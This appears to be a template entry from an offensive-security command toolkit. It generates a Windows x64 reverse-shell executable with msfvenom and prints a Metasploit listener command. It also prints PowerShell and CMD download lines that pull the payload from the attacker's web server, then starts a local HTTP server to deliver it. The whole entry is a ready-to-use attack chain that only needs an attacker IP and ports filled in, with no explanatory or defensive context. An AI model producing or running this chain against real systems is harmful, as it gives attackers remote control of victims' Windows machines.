content: "mkdir -p packstation/outbound; echo 'msfvenom creates the payload. Please\
  \ wait...'; \\\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST={{ attacker_ip }}\
  \ LPORT={{ shell_port }} -f exe > packstation/outbound/revshell.exe ; \\\necho '================================================================';\
  \ \\\necho '                      ------Listener------                      '; \\\
  \necho 'Start listener: msfconsole -q -x \"use exploit/multi/handler;set payload\
  \ windows/x64/shell_reverse_tcp;set LHOST {{ attacker_ip }};set LPORT {{ shell_port\
  \ }};run;\"'; \\\necho '================================================================';\
  \ \\\necho '                      -----PowerShell-----                      '; \\\
  \necho 'Deliver only: iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port\
  \ }}/revshell.exe -Outfile {{ delivery_path_windows }}\\revshell.exe'; \\\necho\
  \ '================================================================'; \\\necho '\
  \                         -----CMD-----                          '; \\\necho 'Deliver\
  \ only: powershell wget -uri http://{{ attacker_ip }}:{{ delivery_outbound_port\
  \ }}/revshell.exe -Outfile {{ delivery_path_windows }}\\revshell.exe'; \\\necho\
  \ '================================================================'; \\\n python\
  \ {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port\
  \ }} -d packstation/outbound\n"
